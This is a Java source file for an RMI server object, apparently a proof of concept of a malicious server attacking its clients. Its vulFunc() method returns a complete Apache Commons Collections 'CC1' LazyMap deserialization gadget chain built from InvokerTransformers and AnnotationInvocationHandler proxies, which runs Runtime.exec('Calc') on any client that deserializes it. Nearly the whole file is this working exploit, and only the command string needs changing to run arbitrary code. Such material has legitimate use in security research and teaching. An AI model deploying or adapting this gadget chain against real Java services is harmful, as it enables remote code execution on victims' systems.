package org.example.serverAttackClient;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;
import java.util.Map;

public class RemoteObjectImpl extends UnicastRemoteObject implements RemoteObjectInterface{

    protected RemoteObjectImpl() throws RemoteException {
    }

    @Override
    public String sayHello(String s) throws RemoteException {
        String upS = s.toUpperCase();
        System.out.println(upS);
        return upS;
    }

    @Override
    public Object vulFunc() throws Exception{
        return getCCPayload();
    }
    public static Object getCCPayload()throws Exception{
        //CC1-LazyMap
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"Calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put("key","value");
        Map lazyMap = (Map) LazyMap.decorate(hashMap,chainedTransformer);
//        lazyMap.get("Jasper");
        Class<?> aihClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstuctor = aihClass.getDeclaredConstructor(Class.class,Map.class);
        aihConstuctor.setAccessible(true);
        InvocationHandler aih = (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);
        Map lazyMapProxy = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);

        InvocationHandler aih2 = (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);
        return aih2;
    }

}
